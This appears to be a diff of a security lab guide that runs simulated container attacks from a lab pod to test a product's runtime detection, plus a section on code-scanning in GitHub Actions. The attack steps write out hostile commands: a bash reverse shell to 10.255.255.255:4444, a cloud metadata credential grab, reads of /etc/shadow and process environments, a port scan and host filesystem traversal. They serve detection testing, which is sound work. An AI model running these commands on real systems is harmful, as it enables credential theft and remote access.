@@ -237,90 +237,106 @@ tells you what risks exist; AI Guard controls what users actually experience.
 
 ## Test Suite 4 — Container Security: Runtime Attacks
 
-Run the automated simulation from the SSM session:
+All phases run from the **bootstrap EC2 SSM session** using `kubectl exec` against
+the `trendai-app` pod in the EKS cluster. Run the full simulation automatically:
 
 ```bash
 cs-attack
 ```
 
-Or run individual phases manually.
-
-### 4.1 Container escape — host filesystem access (T1611)
+Or run individual phases manually. Confirm the app pod name first:
 
 ```bash
-docker exec lab-app sh -c "ls /proc/1/root/etc/ 2>/dev/null | head -5"
+kubectl get pods -n trendai-lab
+# note the trendai-app-<hash> pod name
+APP_POD=$(kubectl get pods -n trendai-lab -l app=trendai-app -o jsonpath='{.items[0].metadata.name}')
 ```
 
-**Expected:** Container Security flags the access attempt. If the container is not
-privileged (it is not, by default), the access will fail — but the attempt itself
-is the detectable event.
+### 4.0 Admission controller — block a privileged pod (T1611)
+
+Before running runtime attacks, demonstrate policy enforcement at deploy time:
+
+```bash
+kubectl run priv-test --image=alpine --privileged -n trendai-lab -- sleep 3600
+```
+
+**Expected:** If a deny policy is configured in Vision One Container Security, the
+admission controller blocks this pod before it starts. The API server returns a
+rejection message naming the policy violation.
 
 ---
 
-### 4.2 Sensitive file read inside container (T1552)
+### 4.1 Sensitive file read inside the app pod (T1552)
 
 ```bash
-docker exec lab-app sh -c "cat /etc/shadow 2>/dev/null | head -3"
-docker exec lab-app sh -c "cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -10"
+kubectl exec -n trendai-lab $APP_POD -- sh -c "cat /etc/shadow 2>/dev/null | head -3 || echo 'Permission denied'"
+kubectl exec -n trendai-lab $APP_POD -- sh -c "cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -5 || echo 'Not accessible'"
 ```
 
-**Expected:** Container Security detects sensitive file access inside the container.
-Check Vision One > Container Security > Runtime Events.
+**Expected:** Container Security runtime sensor (Falco) detects sensitive file
+access inside the pod. Check Vision One > Container Security > Runtime Events.
 
 ---
 
-### 4.3 Malicious script drop and execution (T1059.004)
+### 4.2 Malicious script drop and execution (T1059.004)
 
 ```bash
-docker exec lab-app sh -c \
-  "echo '#!/bin/sh\nid; hostname; cat /etc/os-release' > /tmp/recon.sh \
-   && chmod +x /tmp/recon.sh && /tmp/recon.sh"
+kubectl exec -n trendai-lab $APP_POD -- sh -c \
+  "echo '#!/bin/sh\nid; hostname; uname -a' > /tmp/recon.sh && chmod +x /tmp/recon.sh && /tmp/recon.sh"
 ```
 
 **Expected:** Container Security flags:
-1. A new executable written to `/tmp` (non-standard path)
-2. Execution of a freshly created script
+1. A new executable written to `/tmp` inside the pod
+2. Execution of a freshly created script in an unexpected path
 
 ---
 
-### 4.4 IMDS credential theft (T1552.005)
+### 4.3 IMDS credential theft (T1552.005)
 
 ```bash
-docker exec lab-app sh -c \
-  "curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null \
-   || echo 'No role attached — IMDS reachable but empty'"
+kubectl exec -n trendai-lab $APP_POD -- sh -c \
+  "curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo 'IMDS not reachable or no role'"
 ```
 
-**Expected:** Container Security detects the outbound request to the IMDS endpoint
-`169.254.169.254` — a high-confidence indicator of credential theft in a container context.
+**Expected:** Container Security detects the outbound connection to
+`169.254.169.254` from inside the pod — a high-confidence credential theft signal
+specific to cloud container environments.
 
 ---
 
-### 4.5 Internal network scan from container (T1046)
+### 4.4 Internal network scan from inside the pod (T1046)
 
 ```bash
-docker exec lab-app sh -c \
-  "for p in 22 80 443 3306 5432 6379 8080 8443; do \
-     timeout 1 bash -c \"echo >/dev/tcp/172.17.0.1/\$p\" 2>/dev/null \
-     && echo \"port \$p open\" || true; \
-   done"
+kubectl exec -n trendai-lab $APP_POD -- sh -c \
+  "for p in 22 80 443 3306 5432 6379; do timeout 1 bash -c \"echo >/dev/tcp/10.20.0.1/\$p\" 2>/dev/null && echo \"port \$p open\" || true; done"
 ```
 
 **Expected:** Container Security flags anomalous internal port scanning originating
-from the `lab-app` container process.
+from the app pod process.
 
 ---
 
-### 4.6 Reverse shell simulation (T1059)
+### 4.5 Reverse shell simulation (T1059)
 
 ```bash
-docker exec lab-app sh -c \
+kubectl exec -n trendai-lab $APP_POD -- sh -c \
   "timeout 5 bash -i >& /dev/tcp/10.255.255.255/4444 0>&1 2>/dev/null; true"
 ```
 
-**Expected:** Container Security detects the attempt to establish an outbound
-reverse shell connection from the container — even though the connection fails
-(no listener at the destination).
+**Expected:** Container Security detects the reverse shell attempt from the pod —
+even though the connection fails (no listener). The syscall pattern is the trigger.
+
+---
+
+### 4.6 Container namespace escape attempt (T1611)
+
+```bash
+kubectl exec -n trendai-lab $APP_POD -- sh -c \
+  "ls /proc/1/root/etc/ 2>/dev/null | head -5 || echo 'Access denied'"
+```
+
+**Expected:** Container Security flags the attempt to traverse the host filesystem
+via the `/proc/1/root` path from inside the pod.
 
 ---
 
@@ -336,51 +352,51 @@ For each event, walk through:
 
 ---
 
-## Test Suite 5 — Code Security: Repository Findings
+## Test Suite 5 — Code Security: GitHub Actions Scan
 
-This is a review exercise, not an attack. Work from the Vision One console.
+Code Security runs via `trendmicro/tmas-scan-action@v2` in GitHub Actions on every
+push and pull request. The workflow file is at `.github/workflows/v1-code-security.yml`
+in your demo repo fork.
 
-### 5.1 Review initial scan findings
+### 5.1 Review a completed scan
 
-- Open Vision One > Code Security > Repositories > select the demo repo.
-- Under **Findings**, filter by severity (Critical/High first).
-- For each finding, identify:
-  - **File and line number** — what is the exact code?
-  - **Category** — secret, CVE, IaC misconfiguration, or SAST?
-  - **Remediation** — what would fix it?
+- Open the demo repo fork on GitHub > **Actions** tab.
+- Click the most recent **Vision One Code Security** run.
+- Expand the **TMAS Scan Report** step in the logs.
+- Look for findings in three categories:
+  - **Secrets** — hardcoded API keys, tokens, or credentials in the codebase
+  - **Vulnerabilities** — Python package CVEs from `requirements.txt`
+  - **Malware** — any committed files detected as malicious
 
-### 5.2 Secrets scan
+### 5.2 Show a scan on a pull request
 
-Look for any findings in the **Secrets** category. Common findings in this repo:
-- API key patterns in `.env.example` or `docker-compose.yml`
-- Any hardcoded tokens in `app.py`
+- Open any open PR on the fork, or create one.
+- The workflow posts an automatic summary comment on the PR.
+- Walk through the comment: what did it find, what severity, what file/line?
 
-### 5.3 Dependency CVE check
+**This is the developer experience:** findings arrive in the PR review, not a
+separate portal. The developer sees the issue before it merges.
 
-- Open the **Dependencies** tab (if available) or filter findings for `requirements.txt`.
-- Note any Python packages with known CVEs — Python version, FastAPI, requests, etc.
-- Cross-reference one CVE with the NVD to explain the real-world risk.
-
-### 5.4 IaC misconfiguration
-
-Look for findings related to `docker-compose.yml`:
-- Exposed ports (`0.0.0.0` binding)
-- Missing security options (`no-new-privileges`, `read_only`)
-- Container running as root
-
-### 5.5 Trigger a new scan (live demo)
+### 5.3 Trigger a live scan
 
 ```bash
-# On your local machine (not the lab instance), clone the repo and make a trivial change
-git clone https://github.com/andrefernandes86/demo-v1-app-sec-file-sec /tmp/demo-repo
-cd /tmp/demo-repo
+cd /tmp/demo-repo  # or clone the fork locally
 echo "# lab test $(date)" >> requirements.txt
 git add requirements.txt
 git commit -m "lab: trigger Code Security rescan"
 git push
 ```
 
-Watch the scan trigger automatically in Vision One > Code Security > Repositories.
+Watch the **Actions** tab — the workflow triggers within seconds and completes
+in ~1 minute.
+
+### 5.4 Show the workflow configuration
+
+Open `.github/workflows/v1-code-security.yml` in the repo. Point out:
+- `trendmicro/tmas-scan-action@v2` — the official Vision One action
+- `vulnerabilitiesScan`, `secretsScan`, `malwareScan` flags
+- `TMAS_API_KEY` stored as a GitHub secret — same key as everything else in the lab
+- `pull-requests: write` permission — required for the PR comment
 
 ---
 
@@ -398,12 +414,13 @@ Watch the scan trigger automatically in Vision One > Code Security > Repositorie
 | 2.1 EICAR upload | T1105 | | ✓ detected | | | |
 | 2.3 Custom file upload | T1105 | | ✓ scanned | | | |
 | 3.1–3.2 AI Scanner | LLM01/02/04/06/10 | | | ✓ full report | | |
-| 4.1 Container escape | T1611 | | | | ✓ runtime event | |
-| 4.2 Sensitive file read | T1552 | | | | ✓ runtime event | |
-| 4.3 Script drop + exec | T1059.004 | | | | ✓ runtime event | |
-| 4.4 IMDS credential theft | T1552.005 | | | | ✓ runtime event | |
-| 4.5 Internal network scan | T1046 | | | | ✓ runtime event | |
-| 4.6 Reverse shell | T1059 | | | | ✓ runtime event | |
+| 4.0 Privileged pod deploy | T1611 | | | | ✓ admission block | |
+| 4.1 Sensitive file read | T1552 | | | | ✓ runtime event | |
+| 4.2 Script drop + exec | T1059.004 | | | | ✓ runtime event | |
+| 4.3 IMDS credential theft | T1552.005 | | | | ✓ runtime event | |
+| 4.4 Internal network scan | T1046 | | | | ✓ runtime event | |
+| 4.5 Reverse shell | T1059 | | | | ✓ runtime event | |
+| 4.6 Namespace escape | T1611 | | | | ✓ runtime event | |
 | 5.1–5.5 Repo scan | — | | | | | ✓ findings |
 
 ---
